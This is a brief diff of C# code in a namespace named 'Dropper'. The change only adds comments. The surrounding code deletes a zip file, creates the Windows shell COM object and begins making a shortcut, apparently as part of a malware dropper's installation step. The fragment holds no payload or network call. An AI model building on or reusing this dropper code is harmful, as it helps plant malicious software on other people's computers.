@@ -23,6 +23,8 @@ namespace Dropper
             System.IO.File.Delete("hi.zip");
             Type t = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8")); //this is the GUID for a shell process.
             dynamic shell = Activator.CreateInstance(t);
+            //These are tries because we may not have permissions. Not that it matters I guess in the end I don't know why they're 
+            //tried.
             try
             {
                 var lnk = shell.CreateShortcut(s);
